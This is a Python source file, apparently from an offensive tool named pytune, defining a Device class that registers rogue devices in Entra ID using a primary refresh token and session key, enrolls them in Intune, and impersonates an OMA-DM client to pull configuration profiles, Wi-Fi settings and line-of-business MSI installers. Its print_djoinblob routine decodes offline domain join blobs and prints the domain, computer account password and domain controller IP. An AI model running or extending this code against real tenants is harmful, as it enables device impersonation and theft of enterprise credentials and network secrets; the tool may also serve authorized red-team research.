import os
import re
import jwt
import uuid
import struct
import base64
import requests
import xmltodict
import urllib.parse
from abc import abstractmethod
import xml.etree.ElementTree as ET
from cryptography import x509
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from roadtools.roadlib.deviceauth import DeviceAuthentication
from roadtools.roadlib.auth import Authentication
from utils.utils import prtauth, renew_token, token_renewal_for_enrollment, create_pfx, extract_pfx

class Device:
    def __init__(self, logger, os, device_name, deviceid, uid, tenant, prt, session_key, proxy):
        self.logger = logger
        self.os = os
        self.os_version = None
        self.ssp_version = None
        self.device_name = device_name
        self.deviceid = deviceid
        self.intune_deviceid = None
        self.uid = uid
        self.tenant = tenant
        self.prt = prt
        self.session_key = session_key
        self.checkin_url = None
        self.provider_name = None
        self.cname = None
        self.hwhash = None
        self.proxy = proxy
        self.device_auth = DeviceAuthentication()
        self.device_auth.proxies = proxy
        self.device_auth.verify = False
        self.device_auth.auth.proxies = proxy
        self.device_auth.auth.verify = False

    def entra_join(self, username, password, access_token, deviceticket):
        devicereg = 'urn:ms-drs:enterpriseregistration.windows.net'
        if access_token:
            claims = jwt.decode(access_token, options={"verify_signature":False}, algorithms=['RS256'])
            if claims['aud'] != devicereg:
                self.logger.info(f"wrong resource uri! {devicereg} is expected")
                return
        else:
            auth = Authentication(username=username, password=password)
            auth.resource_uri = devicereg
            auth.proxies = self.proxy
            auth.verify = False
            access_token = auth.authenticate_username_password()['accessToken']            

        certpath = f'{self.device_name}_cert.pem'
        keypath = f'{self.device_name}_key.pem'
        self.device_auth.register_device(
            access_token=access_token,
            jointype=0, # 0 : join, 4 : register
            certout=certpath,
            privout=keypath, 
            device_type=self.os,
            device_name=self.device_name,
            os_version=self.os_version,
            deviceticket=deviceticket
            )
        
        pfxpath = f'{self.device_name}.pfx'
        create_pfx(certpath, keypath, pfxpath)

        os.remove(certpath)
        os.remove(keypath)
        self.logger.success(f'successfully registered {self.device_name} to Entra ID!')
        self.logger.info(f'here is your device certificate: {pfxpath} (pw: password)')
        return
    
    def entra_delete(self, certpfx):
        certpath = f'device_cert.pem'
        keypath = f'device_key.pem'
        extract_pfx(certpfx, certpath, keypath)

        self.device_auth.loadcert(pemfile=certpath, privkeyfile=keypath)
        self.device_auth.delete_device(certpath, keypath)
        
        os.remove(certpath)
        os.remove(keypath)        
        return

    def enroll_intune(self):
        access_token, refresh_token = prtauth(self.prt, self.session_key, '9ba1a5c7-f17a-4de9-a1f1-6178c8d51223', 'https://graph.microsoft.com/', None, self.proxy)
        enrollment_url = self.get_enrollment_info(access_token, self.provider_name)
        self.logger.info(f"resolved enrollment url: {enrollment_url}")
        
        private_key = rsa.generate_private_key(
            public_exponent=65537,  
            key_size=2048           
            )
        
        csr_token = self.get_enrollment_token(refresh_token)
        csr_der = self.create_csr(private_key, self.cname)

        csr_pem = base64.b64encode(csr_der).decode('utf-8')
        try:
            self.logger.info('enrolling device to Intune...')
            response = self.send_enroll_request(enrollment_url, csr_pem, csr_token, None)
        except:
            self.logger.error('device enrollment failed. maybe enrollment restriction?')
            return

        my_cert = self.parse_enroll_response(response)
        if my_cert == None:
            self.logger.error(f'certificate signing request failed. retry later')
            return
        
        pfxpath = f'{self.device_name}_mdm.pfx'
        self.save_mdm_certs(private_key, my_cert, pfxpath)
        self.logger.success(f'successfully enrolled {self.device_name} to Intune!')
        self.logger.info(f'here is your MDM pfx: {pfxpath} (pw: password)')
        return
    
    @abstractmethod
    def get_enrollment_token(self, refresh_token):
        pass

    def get_enrollment_info(self, access_token, provider_name):
        response = requests.get(
            "https://graph.microsoft.com/v1.0/myorganization/servicePrincipals/appId=0000000a-0000-0000-c000-000000000000/endpoints",
            headers={"Authorization": f"Bearer {access_token}"},
            proxies=self.proxy,
            verify=False
        )

        for value in response.json()['value']:
            if value['providerName'] == provider_name:
                return value['uri']

        return None

    @abstractmethod
    def send_enroll_request(self, enrollment_url, access_token_b64, csr_pem, ztdregistrationid):
        pass

    def extract_profiles(self, cmds):
        profiles = []
        if 'Add' not in cmds:
            return profiles
        excluded_keys = ['FakePolicy', 'EntDMID', 'ResetPasswordToken']
        for cmd in cmds['Add']:
            locuri = cmd['Item']['Target']['LocURI']
            is_excluded = False
            for excluded_key in excluded_keys:
                if excluded_key in locuri:
                    is_excluded = True
    
            if is_excluded == False and 'Data' in cmd['Item']:
                    profiles.append({'LocURI': locuri, 'Data':cmd['Item']['Data']})
        return profiles

    def extract_msi_url(self, cmds):
        urls = []
        if 'Exec' not in cmds:
            return urls
        for cmd in cmds['Exec']:
            locuri = cmd['Item']['Target']['LocURI']
            if 'DownloadInstall' in locuri:
                xml = cmd['Item']['Data']
                start = xml.find('<ContentURL>') + len('<ContentURL>')
                end = xml.find('</ContentURL>')
                url = xml[start:end].strip()
                if 'IntuneWindowsAgent.msi' not in url:
                    urls.append(url.replace('&amp;', '&'))
        return urls
    
    def extract_odjblob(self, cmds):
        if 'Exec' not in cmds:
            return None
        for cmd in cmds['Exec']:
            locuri = cmd['Item']['Target']['LocURI']
            if locuri == './Vendor/MSFT/OfflineDomainJoin/Blob':                    
                return cmd['Item']['Data']
        return None
    
    def print_djoinblob(self, djoin_encoded):
        djoinblob = base64.b64decode(djoin_encoded)
        
        chars=''
        for b in djoinblob:
            if b == 0:
                continue
            elif 32<= b <= 126:
                chars+=chr(b)
            else:
                chars+=' '
        
        def get_str_and_next(blob, start):
            str_size = (struct.unpack('<I', blob[start:start+0x4])[0]) * 2
            str = blob[start+0xc:start+0xc+str_size].decode('utf-16le')

            next = start+0xc+len(str)*2
            if next % 4 != 0:
                next +=+2

            return str, next

        self.logger.info('parse domain join info...')
        start = 0xc0
        domain, next = get_str_and_next(djoinblob, start)
        computername, next = get_str_and_next(djoinblob, next)
        password, next = get_str_and_next(djoinblob, next)
        dcip = re.compile(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b').findall(chars)

        print(f' - domain: {domain}')
        print(f' - computername: {computername}$')
        print(f' - computerpass: {password}')
        print(f' - dc ip address: {dcip[0]}')

        return    

    def download_msi(self, msi_url, certpath, keypath):
        parsed_url = urllib.parse.urlparse(msi_url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        file_name_hash = query_params.get('fileNameHash', [None])[0]

        response = requests.get(
            url=msi_url,
            cert=(certpath, keypath),
            )
        
        if response.status_code == 200 and file_name_hash:
            filename = os.path.splitext(file_name_hash)[0]
            with open(filename, 'wb') as f:
                f.write(response.content)
            self.logger.success(f'successfully downloaded to {filename}')
        else:
            self.logger.error(f'failed to download msi file')

    def checkin(self, mdmpfx):
        certpath = 'pytune_mdm.crt'
        keypath = 'pytune_mdm.key'
        extract_pfx(mdmpfx, certpath, keypath)

        imei = str(uuid.uuid4())
        msgid = 1
        sessionid = 1
        syncml_data = self.generate_initial_syncml(sessionid, imei)
        profiles = []
        msi_urls = []
        odjblob = None

        while True:
            self.logger.info(f'send request #{msgid}')
            syncml_data = self.send_syncml(syncml_data, certpath, keypath)
            if 'Unenroll' in syncml_data.decode():
                self.logger.alert(f'unenrolling this device ...')
            
            if 'Bad Request' in syncml_data.decode():
                break

            cmds = self.parse_syncml(syncml_data)
            if cmds == None:
                break

            profiles.extend(self.extract_profiles(cmds))

            msi_urls.extend(self.extract_msi_url(cmds))

            if odjblob is None:
                odjblob = self.extract_odjblob(cmds)

            msgid+=1
            syncml_data = self.generate_syncml_response(msgid, sessionid, imei, cmds)

        self.logger.info(f'checkin ended!')
        if len(profiles) > 0:
            self.logger.alert(f'maybe these are configuration profiles:')
            for profile in profiles:
                if 'WlanXml' in profile["LocURI"]:
                    print(f'- {profile["LocURI"]}:')
                    print(xmltodict.parse(profile["Data"]))
                else:
                    print(f'- {profile["LocURI"]}: {profile["Data"]}')
        
        if len(msi_urls):
            self.logger.alert(f'we found line-of-business app...')
            for msi_url in msi_urls:
                self.logger.info(f'downloading msi file from {msi_url}')
                self.download_msi(msi_url, certpath, keypath)


        if odjblob:
            self.logger.success(f'got online domain join blob')
            self.print_djoinblob(odjblob)
            
        os.remove(certpath)
        os.remove(keypath)
        return

    def check_compliant(self):
        access_token, refresh_token = prtauth(self.prt, self.session_key, '9ba1a5c7-f17a-4de9-a1f1-6178c8d51223', 'https://graph.microsoft.com/', None, self.proxy)
        iwservice_url = self.get_enrollment_info(access_token, 'IWService')        
        self.logger.info(f"resolved IWservice url: {iwservice_url}")
        token_renewal_url = self.get_enrollment_info(access_token, 'TokenRenewalService')
        self.logger.info(f"resolved token renewal url: {token_renewal_url}")      
        renewal_token = renew_token(refresh_token, '9ba1a5c7-f17a-4de9-a1f1-6178c8d51223', 'd4ebce55-015a-49b5-a083-c84d1797ae8c/.default openid offline_access profile', self.proxy)
        enrollment_token = token_renewal_for_enrollment(token_renewal_url, renewal_token, self.proxy)        
        
        device_name = self.get_device_info(iwservice_url, enrollment_token, 'OfficialName')
        state = self.get_device_info(iwservice_url, enrollment_token, 'ComplianceState')
        if state == 'Compliant':
            self.logger.success(f'{device_name} is compliant!')
            return
        
        self.logger.error(f'{device_name} is not compliant')
        reasons = self.get_device_info(iwservice_url, enrollment_token, 'NoncompliantRules')
        if reasons == None:
            self.logger.info(f'maybe device is already retired or not enrolled yet')
            return
        
        i = 1
        for reason in reasons:
            self.logger.alert(f'non-compliant reason #{i}:')
            print(f' - SettingID: {reason["SettingID"]}')
            print(f' - Title: {reason["Title"]}')
            if "ExpectedValue" in reason:
                print(f' - ExpectedValue: {reason["ExpectedValue"]}')
            print(f' - Description: {reason["Description"]}')
            i = i+1

        return

    def retire_intune(self):
        access_token, refresh_token = prtauth(self.prt, self.session_key, '9ba1a5c7-f17a-4de9-a1f1-6178c8d51223', 'https://graph.microsoft.com/', None, self.proxy)
        iwservice_url = self.get_enrollment_info(access_token, 'IWService')
        self.logger.info(f"resolved IWservice url: {iwservice_url}")
        token_renewal_url = self.get_enrollment_info(access_token, 'TokenRenewalService')
        self.logger.info(f"resolved token renewal url: {token_renewal_url}")
        
        renewal_token = renew_token(refresh_token, '9ba1a5c7-f17a-4de9-a1f1-6178c8d51223', 'd4ebce55-015a-49b5-a083-c84d1797ae8c/.default openid offline_access profile', self.proxy)
        enrollment_token = token_renewal_for_enrollment(token_renewal_url, renewal_token, self.proxy)

        retire_info = self.get_device_info(iwservice_url, enrollment_token, '#CommonContainer.Retire')
        if retire_info == None:
            retire_info = self.get_device_info(iwservice_url, enrollment_token, '#CommonContainer.FullWipe')
        
        if retire_info == None:
            self.logger.info(f'maybe this device is not enrolled or already retired')
            return 
        
        retire_url = retire_info['target']
        self.logger.info(f"resolved reitrement url: {retire_url}")

        result = self.send_retire_request(retire_url, enrollment_token)
        if result == True:
            self.logger.success(f"successfully retired: {self.deviceid}")
        else:
            self.logger.error(f'failed to retire the device')        
        return

    def send_retire_request(self, retire_url, access_token):
        response = requests.post(
            url=f"{retire_url}?api-version=16.4&ssp={self.os}SSP&ssp-version={self.ssp_version}&os={self.os}&os-version={self.os_version}&os-sub=None&arch=ARM&mgmt-agent=Mdm",
            headers={"Authorization": f"Bearer {access_token}"},
            proxies=self.proxy,
            verify=False
            )

        if response.status_code == 204:
            return True
        return False
    
    def get_device_info(self, iwservice_url, access_token, key):
        response = requests.get(
            url=f"{iwservice_url}/Devices?api-version=16.4&ssp={self.os}SSP&ssp-version={self.ssp_version}&os={self.os}&os-version={self.os_version}&os-sub=None&arch=ARM&mgmt-agent=Mdm",
            headers={"Authorization": f"Bearer {access_token}"},
            proxies=self.proxy,
            verify=False
            )

        for value in response.json()['value']:
            if value['AadId'] == self.deviceid:
                if key in value:
                    return value[key]                
        return None

    @abstractmethod
    def get_syncml_data(self, key):
        pass

    def parse_omadm_cmd(self, input, results):
        for omadm_cmd in results.keys():
            if omadm_cmd in input:
                if omadm_cmd == 'Atomic' or omadm_cmd == 'Sequence':
                    if isinstance(input[omadm_cmd], list):
                        for multicmd in input[omadm_cmd]:
                            results[omadm_cmd].append({"CmdID": multicmd['CmdID']})
                            results = self.parse_omadm_cmd(multicmd, results)
                    else:
                        results[omadm_cmd].append({"CmdID": input[omadm_cmd]['CmdID']})
                        results = self.parse_omadm_cmd(input[omadm_cmd], results)
                else:
                    if isinstance(input[omadm_cmd], list):
                        results[omadm_cmd].extend(input[omadm_cmd])
                    else:
                        results[omadm_cmd].append(input[omadm_cmd])
        return results

    def parse_syncml(self, xml_data):
        parsed_dict = xmltodict.parse(xml_data)
        syncml_data = parsed_dict['SyncML']
        sync_body = syncml_data['SyncBody']
        results = {'Get':[], 'Atomic':[], 'Add':[], 'Replace':[], 'Exec':[], 'Sequence':[], 'Delete':[]}
        results = self.parse_omadm_cmd(sync_body, results)
        
        cmdlen = 0
        for omadm_cmd in results.keys():
            cmdlen += len(results[omadm_cmd])

        if cmdlen == 0:
            return None
        else:
            return results

    def generate_syncml_header(self, msgid, sessionid, imei):
        syncml_template = {
            "SyncML": {
                "@xmlns": "SYNCML:SYNCML1.2",
                "SyncHdr": {
                    "VerDTD": "1.2",
                    "VerProto": "DM/1.2",
                    "SessionID": f"{str(sessionid)}",
                    "MsgID": f"{str(msgid)}",
                    "Target": {
                        "LocURI": self.checkin_url
                    },
                    "Source": {"LocURI": f"imei:{imei}"}
                },
                "SyncBody": {}
                }
            }
        return syncml_template

    def generate_initial_syncml(self, sessionid, imei):
        pass

    def generate_syncml_response(self, msgid, sessionid, imei, cmds):

        syncml_data = self.generate_syncml_header(msgid, sessionid, imei)
        msgref = msgid - 1
        syncml_data["SyncML"]["SyncBody"] = {
            "Status": [
                {
                    "CmdID": "1",
                    "MsgRef": str(msgref),
                    "CmdRef": "0",
                    "Cmd": "SyncHdr",
                    "Data": "200",
                },
                {
                    "CmdID": "3",
                    "MsgRef": str(msgref),
                    "CmdRef": "1",
                    "Cmd": "Status",
                    "Data": "200",
                }
            ],
            "Results":[],
            "Final": None,
            }

        cmdid = 8
        for cmd_type in cmds:
            for cmd in cmds[cmd_type]:
                status = {
                    "CmdID": str(cmdid),
                    "MsgRef": str(msgref),
                    "CmdRef": cmd["CmdID"],
                    "Cmd": cmd_type,
                    "Data": "200"            
                }
                if cmd_type == 'Get':
                    locuri = cmd["Item"]["Target"]["LocURI"]                    
                    data = self.get_syncml_data(locuri)
                    if data:
                        print(f' [*] sending data for {locuri}')
                        result = {
                            "CmdID": str(cmdid+1),
                            "MsgRef": str(msgref),
                            "CmdRef": cmd["CmdID"],
                            "Item": {
                                "Source": {
                                    "LocURI": locuri
                                    },
                                "Meta": {
                                    "Format": {"@xmlns": "syncml:metinf", "#text": data["Format"]}
                                },
                                "Data": data["Data"],
                                }
                            }                    
                        syncml_data["SyncML"]["SyncBody"]["Results"].append(result)
                    else:
                        status["Data"] = "404"
                        print(f' [*] no data found for {locuri}')
                    cmdid += 2
                else:
                    cmdid += 1
                syncml_data["SyncML"]["SyncBody"]["Status"].append(status)


        return xmltodict.unparse(syncml_data, pretty=False)

    def send_syncml(self, data, certpath, keypath):
        response = requests.post(
            url=self.checkin_url,
            data=data,
            headers={'User-Agent': f'MSFT {self.os} OMA DM Client/2.7' , 'Content-Type': 'application/vnd.syncml.dm+xml'},
            verify=False,
            cert=(certpath, keypath)
            )
        return response.content
        
    def create_csr(self, private_key, cname):
        csr_subject = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, cname)
        ])

        csr_builder = x509.CertificateSigningRequestBuilder().subject_name(csr_subject)
        csr = csr_builder.sign(private_key, hashes.SHA256(), default_backend())
        der_csr = csr.public_bytes(encoding=serialization.Encoding.DER)
        return der_csr

    def parse_enroll_response(self, xml_security_token):
        xml = ET.fromstring(xml_security_token)
        certpath = 'characteristic/characteristic/characteristic/characteristic/parm'
        my_cert = xml.findall(certpath)[2].attrib['value']
        return my_cert

    def save_mdm_certs(self, private_key, my_cert, pfxpath):
        cert = x509.load_der_x509_certificate(base64.b64decode(my_cert), default_backend())
        pfx = serialization.pkcs12.serialize_key_and_certificates(
            pfxpath.encode('utf-8'),
            private_key,
            cert,
            None,
            serialization.BestAvailableEncryption(b"password")
            )

        with open(pfxpath, 'wb') as outfile:
            outfile.write(pfx)

        return
